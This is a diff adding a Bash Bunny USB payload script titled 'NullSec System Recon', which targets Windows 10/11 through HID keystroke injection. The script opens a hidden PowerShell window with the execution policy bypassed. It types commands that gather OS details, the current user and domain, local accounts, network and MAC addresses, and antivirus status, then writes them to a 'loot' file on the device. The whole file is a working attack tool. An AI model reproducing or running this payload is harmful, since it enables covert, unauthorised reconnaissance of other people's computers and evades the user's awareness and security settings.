@@ -1,0 +1,85 @@
+#!/bin/bash
+#
+# Title:         NullSec System Recon
+# Description:   Comprehensive Windows system reconnaissance saved to loot
+# Author:        bad-antics
+# Version:       1.0
+# Category:      Recon
+# Target:        Windows 10/11
+# Attackmodes:   HID, STORAGE
+
+# Options
+LOOTDIR=/root/udisk/loot/NullSec-System-Recon
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+######## MAKE LOOT DIRECTORY ########
+mkdir -p $LOOTDIR
+
+######## ATTACK ########
+LED ATTACK
+
+# Open hidden PowerShell
+RUN WIN "powershell -w hidden -ep bypass"
+QUACK DELAY 1500
+
+# Set loot path variable
+QUACK STRING "\$loot = (gwmi win32_volume -f 'label=''BashBunny''').Name + 'loot\\NullSec-System-Recon\\';"
+QUACK ENTER
+QUACK DELAY 200
+
+QUACK STRING "\$hostname = \$env:COMPUTERNAME;"
+QUACK ENTER
+QUACK DELAY 200
+
+# Collect system info
+QUACK STRING "\$report = @();"
+QUACK ENTER
+QUACK DELAY 100
+
+QUACK STRING "\$report += '=== SYSTEM INFO ===';"
+QUACK ENTER
+QUACK STRING "\$report += (systeminfo | Select-String 'OS Name|OS Version|System Type|Total Physical Memory');"
+QUACK ENTER
+QUACK DELAY 1000
+
+QUACK STRING "\$report += \"`n=== USER INFO ===\";"
+QUACK ENTER
+QUACK STRING "\$report += \"User: \$env:USERNAME | Domain: \$env:USERDOMAIN | Computer: \$hostname\";"
+QUACK ENTER
+QUACK DELAY 200
+
+QUACK STRING "\$report += \"`n=== LOCAL USERS ===\";"
+QUACK ENTER
+QUACK STRING "\$report += (Get-LocalUser | Select-Object Name, Enabled | Format-Table | Out-String);"
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK STRING "\$report += \"`n=== NETWORK ===\";"
+QUACK ENTER
+QUACK STRING "\$report += (ipconfig /all | Select-String 'IPv4|Default Gateway|DNS Servers|Physical Address');"
+QUACK ENTER
+QUACK DELAY 1000
+
+QUACK STRING "\$report += \"`n=== AV STATUS ===\";"
+QUACK ENTER
+QUACK STRING "\$report += (Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | Format-List | Out-String);"
+QUACK ENTER
+QUACK DELAY 500
+
+# Save to loot
+QUACK STRING "\$report | Out-File -Encoding utf8 (\$loot + \$hostname + '_recon.txt');"
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK STRING "exit"
+QUACK ENTER
+
+# Wait for completion
+sleep 5
+
+######## FINISH ########
+LED FINISH
